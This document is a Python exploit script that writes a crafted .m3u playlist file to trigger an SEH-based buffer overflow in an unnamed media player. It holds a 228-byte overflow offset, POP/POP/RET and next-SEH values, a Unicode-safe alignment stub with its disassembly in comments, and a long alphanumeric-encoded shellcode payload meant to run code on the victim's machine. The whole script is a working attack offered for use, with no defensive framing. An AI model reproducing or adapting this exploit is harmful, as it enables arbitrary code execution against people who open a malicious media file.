#!/usr/bin/python

# crashed on 228
#p/p/r - 0x41006800
#unicode compatoble nops: 006e00,006f00,007000,007100,007200,007300 
#Beginining of shellcode=0012F25D
#EBP=0012E2B8

#0:  58                      pop    eax
#1:  05 00 24 00 11          add    eax,0x11002400
#6:  2d 00 14 00 11          sub    eax,0x11001400
#b:  50                      push   eax
#c:  c3                      ret


buffer = "A"*228

nseh= "\x58\x48"

seh= "\x68\x41"


align="\x58\x6d\x05\x24\x11\x6d\x2d\x14\x11\x6d\x50\x6d\xc3\x6d"

filler="\x6d"*(57+53)
shellcode="PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIX4BM0M0KPQP4IYU01Y0C44KPP00TKR2LL4K22N4TKSBNHLO6WOZMVNQKOFLOLQQSLM2NLMP91HOLMKQGWYRL2R2QGTKQBN0TKPJOL4K0LN1RXK3PHKQHQ0QDKPYO0KQZ3DKPILXISNZ19DKODTKM1HVNQKO6L7QXOLMKQI7NXIP3EL6LC3MJXOKCMO4RUIT1H4K1HNDKQ9C2FDKLLPKTK1HMLM1HSDKKTDKKQZ0TIPDMTMTQKQK1QQIPZB1KOK0QOQO1J4KMBZKDMQMBHOCP2KPKPQX47T3OBQO0TRH0LSGMVM73YZHKO8P88DPM1M0M0NIGTPTB0C8MY3PRKM0KO8U1ZLJC87P6HKPD3BHLBKPM1WKCYYVB0PP0P2010PPOP20QXYZLOIOIPKOJ5F72JLPR6PW1XUI75D431KO8U3UI044LJKOPNLHCEJL9X37M0KPKP2JKPRJKTR6R7QXM2J9WX1OKOZ53SKHKP3NOFTKP61ZOPBHM0LPKPKPQF2JM038PXUTR3K5KOXUECQCRJM026R3QGC8M29IXHQOKOHUU3L8M03MNHR8S8KPOPKPM0QZKPR0QXLKNOLO00KOXUB72HBUBN0MS1KOYEQN1NKOLLMTLOE5BPKOKOKOJI5KKOKOKOKQ93O9HFCEGQY3WKL0FUER1F2JM0R3KOXUAA"

remaining="D"*(20000-len(buffer)-len(nseh)-len(seh)-len(align)-len(filler)-len(shellcode))


buffer+= nseh+seh+align+filler+shellcode
buffer+=remaining


file=open('ss.m3u','w')
file.write(buffer)
file.close()
print "[+] ss.m3u file created successfully"